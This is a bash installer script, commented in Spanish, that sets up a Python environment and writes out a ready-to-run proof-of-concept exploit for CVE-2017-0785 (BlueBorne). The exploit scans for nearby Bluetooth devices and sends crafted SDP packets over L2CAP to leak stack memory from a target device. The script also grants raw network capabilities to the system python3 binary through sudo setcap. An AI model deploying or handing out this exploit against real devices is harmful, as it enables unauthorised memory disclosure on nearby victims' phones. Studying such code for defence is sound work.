#!/bin/bash

# Variables
VENV_DIR="/home/lup1n/Herramientas/meli"
TARGET_SCRIPT="blueborne.py"

# Crear entorno virtual si no existe
if [ ! -d "$VENV_DIR" ]; then
    echo "[*] Creando entorno virtual 'meli' en $VENV_DIR"
    python3 -m venv "$VENV_DIR"
fi

# Activar el entorno virtual
echo "[*] Activando el entorno virtual"
source "$VENV_DIR/bin/activate"

# Comprobar e instalar dependencias
pip_show() {
    pip show "$1" > /dev/null 2>&1
}

install_dependencies() {
    echo "[*] Instalando dependencias pybluez y pwntools"
    pip install git+https://github.com/pybluez/pybluez.git --no-use-pep517
    pip install pwntools
}

if ! pip_show "pybluez" || ! pip_show "pwntools"; then
    install_dependencies
else
    echo "[*] Dependencias ya están instaladas"
fi

# Configurar permisos para el adaptador Bluetooth
echo "[*] Configurando permisos de Bluetooth para Python"
sudo setcap cap_net_raw+eip $(eval readlink -f `which python3`)

# Crear el script de la PoC
echo "[*] Creando el script de la PoC en $TARGET_SCRIPT"
cat << 'EOF' > "$TARGET_SCRIPT"
from pwn import *
import bluetooth

# Función para escanear dispositivos Bluetooth cercanos
def buscar_dispositivos():
    log.info("Escaneando dispositivos Bluetooth...")
    dispositivos = bluetooth.discover_devices(duration=8, lookup_names=True)
    if not dispositivos:
        log.warning("No se encontraron dispositivos. Asegúrate de que el dispositivo de destino esté encendido y dentro del alcance.")
    for addr, name in dispositivos:
        print(f"Dirección: {addr} - Nombre: {name}")
    return dispositivos

if not 'TARGET' in args:
    log.info("Uso: CVE-2017-0785.py TARGET=XX:XX:XX:XX:XX:XX")
    dispositivos = buscar_dispositivos()
    exit()

target = args['TARGET']
service_long = 0x0100
service_short = 0x0001
mtu = 50
n = 30

def packet(service, continuation_state):
    pkt = b'\x02\x00\x00'
    pkt += p16(7 + len(continuation_state))
    pkt += b'\x35\x03\x19'
    pkt += p16(service)
    pkt += b'\x01\x00'
    pkt += continuation_state
    return pkt

p = log.progress('Exploit')
p.status('Creating L2CAP socket')

sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
bluetooth.set_l2cap_mtu(sock, mtu)
context.endian = 'big'

p.status('Connecting to target')
sock.connect((target, 1))

p.status('Sending packet 0')
sock.send(packet(service_long, b'\x00'))
data = sock.recv(mtu)

if data[-3:] != b'\x02':
    log.error('Invalid continuation state received.')

stack = b''

for i in range(1, n):
    p.status('Sending packet %d' % i)
    sock.send(packet(service_short, data[-3:]))
    data = sock.recv(mtu)
    stack += data[9:-3]

sock.close()

p.success('Done')

print(hexdump(stack))
EOF

echo "[*] Script de la PoC creado en $TARGET_SCRIPT"
echo "[*] Para ejecutar el script, asegúrate de activar el entorno virtual:"
echo "    source $VENV_DIR/bin/activate"
echo "    python $TARGET_SCRIPT TARGET=XX:XX:XX:XX:XX:XX"
